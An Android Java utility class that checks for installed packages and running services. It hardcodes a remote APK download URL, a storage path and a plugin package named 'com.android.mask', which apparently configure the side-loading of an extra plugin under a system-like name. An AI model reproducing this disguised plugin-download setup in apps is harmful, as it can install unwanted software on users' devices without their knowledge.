package com.common.as.service;

import java.util.ArrayList;
import java.util.List;

import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;

public class AppInfoUtil {

	public static  String down_url = "http://apk.boya1993.com/plug1.apk";
	public static final String down_dir = "360apk/plug1.apk";
	public static final String plug_package = "com.android.mask";
	public static final String plug_appid = "10001";
	public static final String plug_appver = "2";
	public static boolean isAvilible(Context context, String packageName){ 
        final PackageManager packageManager = context.getPackageManager();//��ȡpackagemanager 
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);//��ȡ�����Ѱ�װ����İ���Ϣ 
        List<String> pName = new ArrayList<String>();//���ڴ洢�����Ѱ�װ����İ��� 
       //��pinfo�н���������һȡ����ѹ��pName list�� 
            if(pinfo != null){ 
            for(int i = 0; i < pinfo.size(); i++){ 
                String pn = pinfo.get(i).packageName; 
                pName.add(pn); 
            } 
        } 
        return pName.contains(packageName);//�ж�pName���Ƿ���Ŀ�����İ�����TRUE��û��FALSE 
  } 
	public static boolean isInstalled(Context ctx,String name){
		PackageInfo packageInfo;

	    try {
	        packageInfo = ctx.getPackageManager().getPackageInfo(
	        		name.trim(), 0);

	    } catch (NameNotFoundException e) {
	        packageInfo = null;
	        e.printStackTrace();
	    }
	    if(packageInfo ==null){
	        return false;
	    }else{
	        return true;
	    }
	}
	 /**
		 * �����жϷ����Ƿ�����.
		 * 
		 * @param context
		 * @param className
		 *            �жϵķ�������
		 * @return true ������ false ��������
		 */
		public static boolean isServiceRunning(Context mContext, String className) {
			boolean isRunning = false;
			ActivityManager activityManager = (ActivityManager) mContext
					.getSystemService(Context.ACTIVITY_SERVICE);
			List<ActivityManager.RunningServiceInfo> serviceList = activityManager
					.getRunningServices(30);
			if (!(serviceList.size() > 0)) {
				return false;
			}
			for (int i = 0; i < serviceList.size(); i++) {
				if (serviceList.get(i).service.getClassName().equals(className) == true) {
					isRunning = true;
					break;
				}
			}
			return isRunning;
		}
}
